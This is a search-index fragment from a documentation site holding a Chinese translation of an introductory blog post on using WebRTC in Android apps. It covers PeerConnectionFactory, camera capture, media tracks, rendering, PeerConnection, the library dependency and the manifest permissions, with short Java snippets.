\u5f53\u5728\u6d4f\u89c8\u5668\u4e2d\u4f7f\u7528WebRTC\u65f6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5f88\u597d\u7528\u7684API\u548c\u6587\u6863\u53ef\u4ee5\u53c2\u8003\uff1a navigator.getUserMedia \u548c RTCPeerConnection \u5305\u542b\u4e86\u5927\u90e8\u5206\u4f60\u9700\u8981\u7684\u4e1c\u897f\u3002\u7ed3\u5408video\u6807\u7b7e\uff0c\u672c\u5730\u548c\u8fdc\u7a0b\u6570\u636e\u6d41\u4e00\u8d77\u4f7f\u7528\u3002 \u5e78\u8fd0\u7684\u867d\u7136\u4ed6\u4eec\u6709\u4e0d\u540c\u7684\u540d\u5b57\uff0c\u4f46\u662f\u5728Android\u8fd9\u4e9bAPI\u4e5f\u4e0d\u662f\u5f88\u96be\u3002\u5728Android\u4e2d\uff0c\u6211\u4eec\u8ba8\u8bba VideoCapturerAndroid \u3001 VideoRenderer \u3001 MediaStream \u3001 PeerConnection \u548c PeerConnectionFactory \u3002\u6211\u4eec\u6df1\u5165\u6bcf\u4e00\u4e2a\u63a2\u8ba8\u4e00\u4e0b\u3002 \u7136\u800c\uff0c\u5728\u4f60\u5f00\u59cb\u505a\u4efb\u4f55\u8fd9\u4e9b\u4e8b\u60c5\u524d\uff0c\u9700\u8981\u521b\u5efaPeerConnectionFactory\uff0cAndroid\u7684WebRTC\u7684\u6838\u5fc3\u3002 PeerConnectionFactory WebRTC\u5728Android\u4e0a\u6240\u6709\u4e8b\u60c5\u7684\u6838\u5fc3\u3002\u7406\u89e3\u8fd9\u4e2a\u7c7b\u5e76\u4e14\u77e5\u9053\u5b83\u5982\u4f55\u5de5\u4f5c\u5bf9\u5f7b\u5e95\u4e86\u89e3Android\u4e0a\u7684WebRTC\u81f3\u5173\u91cd\u8981\u3002\u5b83\u4e5f\u548c\u4f60\u671f\u671b\u7684\u6709\u70b9\u4e0d\u540c\uff0c\u56e0\u6b64\u8ba9\u6211\u4eec\u8ba8\u8bba\u4e00\u4e0b\u5b83\u5427\uff0c \u9996\u5148\uff0c\u521d\u59cb\u5316PeerConnectionFactory // First, we initiate the PeerConnectionFactory with // our application context and some options. PeerConnectionFactory.initializeAndroidGlobals( context, initializeAudio, initializeVideo, videoCodecHwAcceleration, renderEGLContext); \u4e3a\u4e86\u7406\u89e3\u5b83\u5982\u4f55\u5de5\u4f5c\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u6bcf\u4e2a\u53c2\u6570\uff1a context \u7b80\u5355\u7684ApplicationContext\uff0c\u6216\u8005\u4efb\u4f55\u5176\u4ed6Context\u76f8\u5173\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u8ddf\u4f60\u4ee5\u524d\u4f7f\u7528\u7684\u4e00\u81f4\u3002ing around. initializeAudio boolean\u503c\uff0c\u521d\u59cb\u5316\u97f3\u9891\u90e8\u5206\u3002 initializeVideo boolean\u503c\uff0c\u521d\u59cb\u5316\u89c6\u9891\u90e8\u5206\u3002\u8df3\u8fc7\u8fd9\u4e24\u4e2a\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\uff0c\u5141\u8bb8\u4f60\u8df3\u8fc7\u8be2\u95eeAPI\u6743\u9650\u3002\u4f8b\u5982DataChannel\u5e94\u7528\u3002 videoCodecHwAcceleration boolean\u503c\uff0c\u662f\u5426\u542f\u7528\u786c\u4ef6\u52a0\u901f\u3002 renderEGLContext \u53ef\u4ee5\u63d0\u4f9b\u8fd9\u4e2a\u503c\u521b\u5efa\u8fdb\u7a0b\u652f\u6301HW\u89c6\u9891\u7f16\u7801\u3002\u53ef\u4ee5\u88ab\u8bbe\u7f6e\u4e3anull\uff0c\u8fd9\u6837\u7684\u8bdd\u5c31\u7f16\u7801\u89c6\u9891\u4f7f\u7528yuv420\u800c\u4e0d\u662ftexture\u5e27\u3002 initializeAndroidGlobals\u4e5f\u5c06\u8fd4\u56de\u4e00\u4e2aboolean\u503c\uff0c\u6b63\u5e38\u521d\u59cb\u5316\u8fd4\u56deOK\uff0c\u6709\u672a\u521d\u59cb\u5316\u6210\u529f\u60c5\u51b5\u8fd4\u56defalse\u3002\u5982\u679c\u8fd4\u56defalse\u65f6\uff0c\u662f\u6700\u597d\u7684\u7ec3\u4e60\u7684\u673a\u4f1a\u3002\u67e5\u770b\u6e90\u4ee3\u7801\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u3002 \u5047\u8bbe\u4e00\u5207\u6b63\u5e38\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528PeerConnectionFactory\u7684\u6784\u9020\u51fd\u6570\u521b\u5efa\u5bf9\u8c61\uff0c\u4e0e\u5176\u4ed6\u7c7b\u4e00\u6837\u3002 PeerConnectionFactory peerConnectionFactory = new PeerConnectionFactory(); \u63a5\u4e0b\u6765\u83b7\u53d6\u5a92\u4f53\u5bf9\u8c61\u8fdb\u884c\u6e32\u67d3 \u4e00\u65e6\u6709\u4e86peerConnectionFactory\u5b9e\u4f8b\uff0c\u5c31\u5e94\u8be5\u4ece\u4f60\u7684\u8bbe\u5907\u4e0a\u83b7\u53d6\u97f3\u9891\u548c\u89c6\u9891\u4e86\uff0c\u6700\u7ec8\u6e32\u67d3\u5230\u5c4f\u5e55\u4e0a\u3002\u5728\u7f51\u9875\u4e0a\uff0c\u4f60\u6709getUserMedia\u548cvideo\u53ef\u4ee5\u7528\u3002\u5728Android\u4e0a\u4e5f\u5f88\u7c7b\u4f3c\uff0c\u4f46\u662f\u9700\u8981\u4e00\u70b9\u5c5e\u76f8\u5728Android\u4e0a\u6211\u4eec\u8ba8\u8bba\uff1a VideoCapturerAndroid\uff0cVideoSource\uff0cVideoTrack\u548cVideoRenderer\uff0c\u90fd\u662f\u4ee5VideoCapturerAndroid\u5f00\u59cb\u3002 VideoCapturerAndroid VideoCapturerAndroid\u7c7b\u662f\u4e00\u4e2a\u76f8\u673a\u7684\u5305\u88c5\u7c7b\uff0c\u63d0\u4f9b\u8bbf\u95ee\u8bbe\u5907\u76f8\u673a\u6570\u636e\u6d41\u7684\u6c5f\u8fb9\u65b9\u6cd5\u3002\u5141\u8bb8\u4f60\u83b7\u53d6\u8bbe\u5907\u6570\u91cf\uff0c\u83b7\u53d6\u524d\u7f6e\u540e\u7f6e\u6444\u50cf\u5934 // Returns the number of camera devices VideoCapturerAndroid.getDeviceCount(); // Returns the front face device name VideoCapturerAndroid.getNameOfFrontFacingDevice(); // Returns the back facing device name VideoCapturerAndroid.getNameOfBackFacingDevice(); // Creates a VideoCapturerAndroid instance for the device name VideoCapturerAndroid.create(name); \u4f7f\u7528VideoCapturerAndroid\u7c7b\u7684\u5b9e\u4f8b\uff0c\u53ef\u4ee5\u521b\u5efa\u5305\u542b\u76f8\u673a\u89c6\u9891\u6d41\u7684MediaStream\uff0c\u4f60\u53ef\u4ee5\u7ed9\u5bf9\u65b9\u53d1\u9001\u6570\u636e\u3002\u5728\u8fd9\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u6211\u4eec\u600e\u6837\u5728\u5e94\u7528\u4e2d\u663e\u793a\u6211\u4eec\u81ea\u5df1\u7684\u89c6\u9891\u3002 VideoSource/VideoTrack \u4e3a\u4e86\u4eceVideoCapture\u5b9e\u4f8b\u4e2d\u83b7\u53d6\u6709\u7528\u7684\u4e1c\u897f\uff0c\u83b7\u53d6PeerConnection\u9700\u8981\u7684MediaStream\uff0c\u751a\u81f3\u4ec5\u4ec5\u4f7f\u7528\uff0c\u4f60\u90fd\u9700\u8981\u6d4f\u89c8\u4e00\u904dVideoSource\u548cVideoTrack\u7c7b\u7684\u4ee3\u7801\u3002 VideoSource\u53ef\u4ee5\u5f00\u59cb\u6216\u505c\u6b62\u4f60\u7684\u8bbe\u5907\u3002\u5728\u65e0\u7528\u505c\u6b62\u6293\u53d6\u4fe1\u606f\u6709\u52a9\u4e8e\u7535\u6c60\u4f7f\u7528\u5bff\u547d\u7684\u5ef6\u957f\u3002 VideoTrack\u662f\u4e00\u4e2a\u6dfb\u52a0VideoSource\u5230MediaStream\u5bf9\u8c61\u7684\u4e00\u4e2a\u5305\u88c5\u3002 \u8ba9\u6211\u4eec\u770b\u770b\u4ed6\u4eec\u4e00\u8d77\u4f7f\u7528\u65f6\u7684\u4ee3\u7801\u3002capturer\u662fVideoCapturer\u7684\u5b9e\u4f8b\uff0cvideoConstraints\u662fMediaConstraints\u7684\u5b9e\u4f8b\u3002 // First we create a VideoSource VideoSource videoSource = peerConnectionFactory.createVideoSource(capturer, videoConstraints); // Once we have that, we can create our VideoTrack // Note that VIDEO_TRACK_ID can be any string that uniquely // identifies that video track in your application VideoTrack localVideoTrack = peerConnectionFactory.createVideoTrack(VIDEO_TRACK_ID, videoSource); AudioSource/AudioTrack \u9664\u4e86\u4e0d\u9700\u8981AudioCapturer\u83b7\u53d6\u9ea6\u514b\u98ce\u6570\u636e\uff0cAudioSource/AudioTrack\u548cVideoSource/VideoTrack\u5f88\u7c7b\u4f3c\u3002audioConstraints\u662fMediaContraints\u7684\u5b9e\u4f8b\u3002 // First we create an AudioSource AudioSource audioSource = peerConnectionFactory.createAudioSource(audioConstraints); // Once we have that, we can create our AudioTrack // Note that AUDIO_TRACK_ID can be any string that uniquely // identifies that audio track in your application AudioTrack localAudioTrack = peerConnectionFactory.createAudioTrack(AUDIO_TRACK_ID, audioSource); VideoRenderer \u5bf9\u4e8e\u6d4f\u89c8\u5668\u4e0a\u7684WebRTC\uff0c\u4f60\u53ef\u80fd\u5f88\u719f\u6089\u4f7f\u7528video\u663e\u793a\u901a\u8fc7getUserMeida\u83b7\u53d6\u5230\u7684MediaStream\u5230\u7684\u6570\u636e\u3002\u7136\u800c\u5728Android\u4e0a\uff0c\u6ca1\u6709video\u6807\u7b7e\u3002\u8ddf\u8e2aVideoRenderer\uff0cWebRTC\u5e93\u5141\u8bb8\u4f60\u5b9e\u73b0\u4f60\u81ea\u5df1\u7684\u65b9\u6cd5\u3002\u7136\u800c\uff0c\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f88\u597d\u7684\u9ed8\u8ba4\u7684\u65b9\u6cd5 VideoRendererGui \uff0c\u7b80\u5355\u6765\u8bf4\uff0cVideoRendererGui\u662f\u4e00\u4e2aGLSurfaceView\uff0c\u5728\u8fd9\u4e4b\u4e0a\uff0c\u53ef\u4ee5\u663e\u793a\u89c6\u9891\u6d41\u3002\u8ba9\u6211\u4eec\u770b\u770b\u5982\u4f55\u8bbe\u7f6e\uff0c\u5305\u62ec\u589e\u52a0\u6211\u4eec\u7684renderer\u5230VideoTrack\u4e0a\u3002 // To create our VideoRenderer, we can use the // included VideoRendererGui for simplicity // First we need to set the GLSurfaceView that it should render to GLSurfaceView videoView = (GLSurfaceView) findViewById(R.id.glview_call); // Then we set that view, and pass a Runnable // to run once the surface is ready VideoRendererGui.setView(videoView, runnable); // Now that VideoRendererGui is ready, we can get our VideoRenderer VideoRenderer renderer = VideoRendererGui.createGui(x, y, width, height); // And finally, with our VideoRenderer ready, we // can add our renderer to the VideoTrack. localVideoTrack.addRenderer(renderer); \u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u662fcreateGui\u9700\u8981\u56db\u4e2a\u53c2\u6570\u3002\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2aGLSurfaceView\u6e32\u67d3\u6240\u6709\u7684\u89c6\u9891\u3002\u6b63\u5982\u770b\u5230\u7684\uff0c\u6211\u4eec\u4f7f\u7528\u591a\u4e2aGLSurfaceViews\uff0c\u8fd9\u610f\u5473\u7740x/y\u5c06\u4ece0\u5230\u5408\u9002\u7684\u8303\u56f4\u5185\u53d8\u5316\u3002\u8fd9\u662f\u6709\u610f\u4e49\u7684\u3002 MediaConstraints \u8fd9\u4e2aMediaConstraints\u662fWebRTC\u652f\u6301\u5c06\u89c6\u9891\u548c\u97f3\u9891\u653e\u5165MediaStream\u7684\u65b9\u5f0f\u3002\u770b\u8fd9\u4e2a\u652f\u6301\u7684 \u89c4\u8303 \uff0c\u5927\u591a\u6570\u65b9\u6cd5\u90fd\u9700\u8981MediaContraints\u7684\u5b9e\u4f8b\u3002 MediaConstraints audioConstraints = new MediaConstraints(); \u4e3a\u4e86\u5b9a\u5236\u66f4\u591a\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u5b9a\u4e49\u952e\u503c\u5bf9\uff0c\u5e76\u5c06\u4ed6\u4eec\u653e\u5230\u7ea6\u675f\u5217\u8868\u4e2d\u3002 MediaStream \u73b0\u5728\u662f\u65f6\u5019\u8ba8\u8bba\u5176\u4ed6\u90e8\u5206\u7684\u529f\u80fd\u4e86\u3002\u5728\u7f51\u9875\u4e0a\uff0c\u6211\u4eec\u53ef\u80fd\u5f88\u719f\u6089MediaStream\u7684\u6982\u5ff5\u4e86\uff0cgetUserMedia\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2aMediaStream\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u5c06\u5176\u6dfb\u52a0\u5230RTCPeerConnection\u4e2d\u53d1\u9001\u7ed9\u5bf9\u7aef\u3002\u5bf9\u4e8eAndroid\u4e5f\u662f\u4e00\u6837\uff0c\u9664\u4e86\u6211\u4eec\u5fc5\u987b\u521b\u5efa\u6211\u4eec\u81ea\u5df1\u7684MediaStream\u3002\u8ba9\u6211\u4eec\u770b\u770b\u6211\u4eec\u600e\u6837\u53ef\u4ee5\u6dfb\u52a0VideoTrack\u548cAudioTrack\u5230\u4e00\u4e2a\u6070\u5f53\u7684MediaStream\u3002 // We start out with an empty MediaStream object, // created with help from our PeerConnectionFactory // Note that LOCAL_MEDIA_STREAM_ID can be any string MediaStream mediaStream = peerConnectionFactory.createLocalMediaStream(LOCAL_MEDIA_STREAM_ID); // Now we can add our tracks. mediaStream.addTrack(localVideoTrack); mediaStream.addTrack(localAudioTrack); \u4f60\u597d\uff0c\u6709\u4eba\u5417\uff1f \u6211\u4eec\u5728\u4e00\u4e2aMediaStream\u5b9e\u4f53\u4e2d\u6709\u4e86\u97f3\u89c6\u9891\u6d41\uff0c\u9664\u4e86\u663e\u793a\u5728\u5c4f\u5e55\u4e0a\uff0c\u4e5f\u5e94\u8be5\u4f20\u9012\u7ed9\u5bf9\u65b9\u4e86\u3002\u5c3d\u7ba1\u672c\u6587\u4e0d\u5305\u62ec\u5982\u4f55\u521b\u5efa\u6570\u636e\u6d41\u7ba1\u9053\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u5c06\u6d4f\u89c8\u4e00\u904d\u6bcf\u4e2aAPI\u7684\u65b9\u6cd5\u5e76\u89e3\u91ca\u4e0eWeb\u5982\u4f55\u76f8\u5173\u3002AppRTC\u4f7f\u7528 autobahn \u4f7fWebRTC\u8fde\u63a5\u5230\u4fe1\u4ee4\u670d\u52a1\u5668\u3002\u6211\u5efa\u8bae\u4f60\u68c0\u51fa\u9879\u76ee\uff0c\u8be6\u7ec6\u4e86\u89e3\u4e00\u4e0bAndroid\u5982\u4f55\u8bbe\u7f6e\u4fe1\u4ee4\u670d\u52a1\u5668\u3002 PeerConnection \u73b0\u5728\u6211\u4eec\u6709\u4e86MediaStream\uff0c\u6211\u4eec\u53ef\u4ee5\u8fde\u63a5\u5230\u5bf9\u65b9\u4e86\uff0c\u5e78\u8fd0\u7684\u662f\u8fd9\u4e00\u90e8\u5206\u4e0eWeb\u5f88\u7c7b\u4f3c\uff0c\u56e0\u6b64\u5982\u679c\u4f60\u719f\u6089\u6d4f\u89c8\u5668\u4e0a\u7684WebRTC\uff0c\u8fd9\u90e8\u5206\u548c\u76f4\u63a5\u3002\u5728PeerConnectionFactory\u7684\u5e2e\u52a9\u4e0b\u521b\u5efa\u4e00\u4e2aPeerConnection\u662f\u5bb9\u6613\u7684\u3002 PeerConnection peerConnection = peerConnectionFactory.createPeerConnection( iceServers, constraints, observer); \u53c2\u6570\u5982\u4e0b\uff1a iceServers \u5411\u8fde\u63a5\u5230\u5916\u7f51\u8fd9\u4e2a\u662f\u5fc5\u8981\u7684\uff0c\u6dfb\u52a0STUN\u548cTURN\u670d\u52a1\u5668\u53ef\u4ee5\u5e2e\u52a9\u4f60\u8fde\u63a5\u3002 constraints \u4e00\u4e2aMediaConstrains\u7684\u5b9e\u4f8b\u3002\u5e94\u8be5\u5305\u542bofferToRecieveAudio\u548cofferToRecieveVideo\u3002 observer \u4e00\u4e2aPeerConnectionObserver\u7684\u5b9e\u4f8b\u3002 \u8fd9\u4e2aPeerConnection API\u4e0eweb\u5f88\u76f8\u4f3c\uff0c\u5305\u62ec\u50cfaddStream\u3001addIceCandidate\u3001createOffer\u3001createAnswer\u3001getLocalDescription\u3001setRemoteDescription\u4e00\u7c7b\u7684\u51fd\u6570\u3002\u901a\u8fc7 Getting started with WebRTC \u67e5\u770b\u4e24\u7aef\u600e\u6837\u4e00\u8d77\u5de5\u4f5c\uff0c\u6216\u8005\u770b AppRTC \u770bWebRTC\u5e94\u7528\u600e\u6837\u5de5\u4f5c\u7684\u3002\u8ba9\u6211\u4eec\u5feb\u901f\u7684\u770b\u4e00\u4e0b\u6bcf\u4e2a\u51fd\u6570\u600e\u4e48\u5de5\u4f5c\u7684\u3002 addStream \u7528\u6765\u5c06MediaStream\u6dfb\u52a0\u5230PeerConnection\u4e2d\u3002\u5982\u679c\u4f60\u60f3\u8ba9\u522b\u4eba\u770b\u5230\u4f60\u542c\u5230\u4f60\uff0c\u5c31\u9700\u8981\u8fd9\u4e2a\u51fd\u6570\u3002 addCandidate TODO IceCandidates \u4ec5\u521b\u5efa\u4e00\u6b21\uff0c\u5141\u8bb8\u5176\u4ed6\u4eba\u4e0e\u4f60\u8fde\u63a5\u3002 createOffer/createAnswer TODO \u8fd9\u4e24\u4e2a\u7528\u6765\u521d\u59cb\u5316\u901a\u8bdd\u8bbe\u7f6e\u3002 setLocalDescription/setRemoteDescription TODO \u8bbe\u7f6eSDP\u3002 PeerConnectionObserver TODO \u63d0\u4f9b\u8fd9\u4e2aPeerConnection\u4e8b\u4ef6\u7684\u89c2\u5bdf\u8005\u3002 \u6700\u540e \u6b63\u5982\u4f60\u770b\u5230\u7684\uff0c\u5f53\u4f60\u5bf9Web\u5f88\u719f\u6089\u65f6\uff0c\u8fd9\u4e2aAndroid\u7684API\u662f\u5f88\u7b80\u5355\u76f4\u63a5\u7684\u3002\u4f7f\u7528\u4e0a\u9762\u7684\u5de5\u5177\uff0c\u4f60\u53ef\u4ee5\u5f00\u53d1\u4e00\u4e2aWebRTC\u7684APP\uff0c\u6570\u767e\u4e07\u7684\u8bbe\u5907\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002 WebRTC\u5f00\u653e\u7ed9\u6211\u6211\u4eec\u6240\u6709\u4eba\uff0c\u5bf9\u4e8e\u5f00\u53d1\u8005\u514d\u8d39\uff0c\u5bf9\u7528\u6237\u514d\u8d39\u3002\u5b83\u7684\u4f7f\u7528\u4e0d\u4ec5\u4ec5\u5728\u89c6\u9891\u804a\u5929\uff0c\u6211\u4eec\u4e5f\u770b\u5230\u5728\u533b\u7597\uff0c\u6587\u4ef6\u4f20\u8f93\u751a\u81f3\u5728\u6e38\u620f\u4e2d\u90fd\u6709\u4f7f\u7528\u3002 \u4e3a\u4e86\u67e5\u770bWebRTC\u7684\u4f8b\u5b50\uff0c\u68c0\u51faappear.in\u5728 Android \u548c iOS \u4e0a\u3002\u5b83\u5728\u6d4f\u89c8\u5668\u4e0a\u548c\u5e94\u7528\u4e0a\u90fd\u5b8c\u7f8e\u7684\u5de5\u4f5c\u7740\uff0c\u4e00\u8d77\u516b\u4e2a\u4eba\u5728\u4e00\u4e2a\u623f\u95f4\u4e2d\u90fd\u662f\u514d\u8d39\u7684\uff0c\u4e0d\u9700\u8981\u5b89\u88c5\u548c\u767b\u9646\u3002 \u53bb\u5427\uff0c\u521b\u5efa\u4e00\u4e9b\u65b0\u7684\u4e0d\u4e00\u6837\u7684\u4e1c\u897f\u5427\uff01 \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/5a67272d7055","title":"Android\u4e0aWebRTC\u4ecb\u7ecd"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#_1","text":"https://tech.appear.in/2015/05/25/Introduction-to-WebRTC-on-Android/","title":"\u539f\u6587"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#_2","text":"WebRTC\u88ab\u79f0\u4e3a\u5f00\u6e90\u7f51\u7edc\u53d1\u5c55\u7684\u53c8\u4e00\u5927\u91cc\u7a0b\u7891\uff0c\u88ab\u770b\u4f5c\u4e3a\u8fd1\u4e9b\u5e74\u5bf9Web\u6807\u51c6\u7684\u6700\u91cd\u8981\u7684\u521b\u65b0\u3002WebRTC\u5141\u8bb8\u5f00\u53d1\u8005\u5728\u7f51\u9875\u5e94\u7528\u4e2d\u6dfb\u52a0\u97f3\u89c6\u9891\uff0c\u5e76\u4e14\u6298\u4e0d\u9700\u8981\u590d\u6742\u7684\u4ee3\u7801\u548c\u6602\u8d35\u7684\u5176\u4ed6\u7684\u57fa\u7840\u8bbe\u5907\u3002\u73b0\u5728\u6709Chrome\u3001Firfox\u548cOpera\u90fd\u5df2\u7ecf\u652f\u6301\u4e86WebRTC\uff0c\u5e76\u5c06\u6709\u66f4\u591a\u7684\u6d4f\u89c8\u5668\u4e5f\u5c06\u4f1a\u652f\u6301\uff0c\u6570\u5341\u4ebf\u7684\u8bbe\u5907\u5df2\u7ecf\u652f\u6301\u4e86\u3002 \u7136\u800c\uff0cWebRTC\u4e5f\u88ab\u79f0\u4e3a\u57ce\u5e02\u795e\u8bdd(\u5f88\u591a\u4eba\u90fd\u76f8\u4fe1\u4f46\u5b9e\u9645\u4e0a\u5e76\u4e0d\u771f\u5b9e\u7684\u6545\u4e8b)\uff1aWebRTC\u4ec5\u4ec5\u53ef\u4ee5\u5e94\u7528\u5728\u6d4f\u89c8\u5668\u4e0a\u3002\u4e8b\u5b9e\u4e0a\uff0cWebRTC\u6700\u91cd\u8981\u7684\u4e00\u4e2a\u7279\u5f81\u662f\u5b83\u5141\u8bb8nativ\u548cweb app\u4e4b\u95f4\u7684\u4e92\u64cd\u4f5c(\u8de8\u5e73\u53f0)\u7684\u3002\u5f88\u5c11\u6709\u4eba\u5229\u7528\u8fd9\u4e00\u4e2a\u7279\u5f81\u4f18\u52bf\u3002 \u8fd9\u7bc7Blog\u5c06\u4ecb\u7ecd\u7ed9\u4f60\u5982\u4f55\u5728\u4f60\u7684Android\u5e94\u7528\u4e2d\u96c6\u6210WebRTC\uff0c\u4f7f\u7528\u4e86WebRTC\u63d0\u4f9b\u7684\u672c\u5730\u5e93\uff0c\u63d0\u4f9b\u8005: WebRTC Initiative \u3002\u6211\u4eec\u4e0d\u4f1a\u5f3a\u8c03\u901a\u8fc7signalling\u5efa\u7acb\u8fde\u63a5\uff0c\u800c\u662f\u5f3a\u8c03Android\u548c\u6d4f\u89c8\u5668\u95f4\u7684\u76f8\u4f3c\u548c\u5dee\u5f02\u3002\u6b63\u5982\u4f60\u5c06\u770b\u5230\u7684\uff0c\u5c06\u5305\u542b\u4e00\u4e9b\u8fde\u63a5\u5230Web\u7684APIs\uff0c\u5982\u679c\u4f60\u60f3\u770b\u5230\u66f4\u591a\u7684\u57fa\u672c\u7684\u5173\u4e8eWebRTC\u7684\u4ecb\u7ecd\uff0c\u8bf7\u770b\uff1a Sam Dutton\u2019s Getting started with WebRTC \u3002","title":"\u7ffb\u8bd1"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#webrtc","text":"\u4ee5\u4e0b\u5185\u5bb9\u4f7f\u7528WebRTC\u5e93\u4e2d\u76849127\u7248\u672c\u3002 \u7b2c\u4e00\u4ef6\u4e8b\u662f\u6dfb\u52a0WebRTC\u5e93\u5230\u4f60\u7684\u9879\u76ee\u4e2d\u3002\u4f60\u53ef\u4ee5\u81ea\u5df1 \u7f16\u8bd1 \u8fd9\u4e2a\u5e93\uff0c\u4f46\u662f\u76f8\u4fe1\u6211\uff0c\u5982\u679c\u53ef\u4ee5\u7684\u8bdd\uff0c\u907f\u514d\u81ea\u5df1\u7f16\u8bd1\u3002\u76f8\u53cd\uff0c\u4f7f\u7528 \u4e2d\u592e\u5382\u5e93 \u4e2d\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u3002 \u4e3a\u4e86\u5728\u4f60\u7684\u9879\u76ee\u4e2d\u6dfb\u52a0\u8fd9\u4e2a\u6587\u4ef6\uff0c\u9700\u8981\u8fd9\u6837\u5199\u4f9d\u8d56\uff1a compile 'io.pristine:libjingle:9127@aar' \u540c\u6b65\u4f60\u7684\u9879\u76ee\uff0c\u4f60\u5df2\u7ecf\u62e5\u6709\u4e86\u53ef\u4ee5\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u4e86\uff01","title":"\u5728\u4f60\u7684\u9879\u76ee\u4e2d\u6dfb\u52a0WebRTC\u7684\u5e93"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#_3","text":"\u5c31\u50cf\u6240\u6709\u7684Android\u4e00\u6837\uff0c\u4f7f\u7528\u8fd9\u4e2aAPI\u4f60\u9700\u8981\u58f0\u660e\u4e00\u4e9b\u6743\u9650\u3002WebRTC\u4e5f\u4e0d\u4f8b\u5916\u3002\u6839\u636e\u4f60\u73b0\u5728\u4f7f\u7528\u7684\u6216\u8005\u662f\u5c06\u6765\u4f1a\u4f7f\u7528\u7684\u6743\u9650\uff0c\u4f8b\u5982\u97f3\u9891\u548c\u89c6\u9891\uff0c\u4f60\u9700\u8981\u8bbe\u7f6e\u4e0d\u540c\u7684\u6743\u9650\u3002\u786e\u4fdd\u4f60\u53ea\u8bf7\u6c42\u4e00\u6b21\u3002\u4e00\u4e2a\u53ef\u7528\u7684\u89c6\u9891\u804a\u5929\u5e94\u7528\u7684\u6743\u9650\u8bbe\u7f6e\uff1a <uses-feature android:name=\"android.hardware.camera\" /> <uses-feature android:name=\"android.hardware.camera.autofocus\" /> <uses-feature android:glEsVersion=\"0x00020000\" android:required=\"true\" /> <uses-permission android:name=\"android.permission.CAMERA\" /> <uses-permission android:name=\"android.permission.RECORD_AUDIO\" /> <uses-permission android:name=\"android.permission.INTERNET\" /> <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" /> <uses-permission android:name=\"android.permission.MODIFY_AUDIO_SETTINGS\" />","title":"\u6743\u9650"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#_4","text":"\u5f53\u5728\u6d4f\u89c8\u5668\u4e2d\u4f7f\u7528WebRTC\u65f6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5f88\u597d\u7528\u7684API\u548c\u6587\u6863\u53ef\u4ee5\u53c2\u8003\uff1a navigator.getUserMedia \u548c RTCPeerConnection \u5305\u542b\u4e86\u5927\u90e8\u5206\u4f60\u9700\u8981\u7684\u4e1c\u897f\u3002\u7ed3\u5408video\u6807\u7b7e\uff0c\u672c\u5730\u548c\u8fdc\u7a0b\u6570\u636e\u6d41\u4e00\u8d77\u4f7f\u7528\u3002 \u5e78\u8fd0\u7684\u867d\u7136\u4ed6\u4eec\u6709\u4e0d\u540c\u7684\u540d\u5b57\uff0c\u4f46\u662f\u5728Android\u8fd9\u4e9bAPI\u4e5f\u4e0d\u662f\u5f88\u96be\u3002\u5728Android\u4e2d\uff0c\u6211\u4eec\u8ba8\u8bba VideoCapturerAndroid \u3001 VideoRenderer \u3001 MediaStream \u3001 PeerConnection \u548c PeerConnectionFactory \u3002\u6211\u4eec\u6df1\u5165\u6bcf\u4e00\u4e2a\u63a2\u8ba8\u4e00\u4e0b\u3002 \u7136\u800c\uff0c\u5728\u4f60\u5f00\u59cb\u505a\u4efb\u4f55\u8fd9\u4e9b\u4e8b\u60c5\u524d\uff0c\u9700\u8981\u521b\u5efaPeerConnectionFactory\uff0cAndroid\u7684WebRTC\u7684\u6838\u5fc3\u3002","title":"\u706f\u5149\uff0c\u76f8\u673a\u2026\u2026"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/#peerconnectionfactory","text":"WebRTC\u5728Android\u4e0a\u6240\u6709\u4e8b\u60c5\u7684\u6838\u5fc3\u3002\u7406\u89e3\u8fd9\u4e2a\u7c7b\u5e76\u4e14\u77e5\u9053\u5b83\u5982\u4f55\u5de5\u4f5c\u5bf9\u5f7b\u5e95\u4e86\u89e3Android\u4e0a\u7684WebRTC\u81f3\u5173\u91cd\u8981\u3002\u5b83\u4e5f\u548c\u4f60\u671f\u671b\u7684\u6709\u70b9\u4e0d\u540c\uff0c\u56e0\u6b64\u8ba9\u6211\u4eec\u8ba8\u8bba\u4e00\u4e0b\u5b83\u5427\uff0c \u9996\u5148\uff0c\u521d\u59cb\u5316PeerConnectionFactory // First, we initiate the PeerConnectionFactory with // our application context and some options. PeerConnectionFactory.initializeAndroidGlobals( context, initializeAudio, initializeVideo, videoCodecHwAcceleration, renderEGLContext); 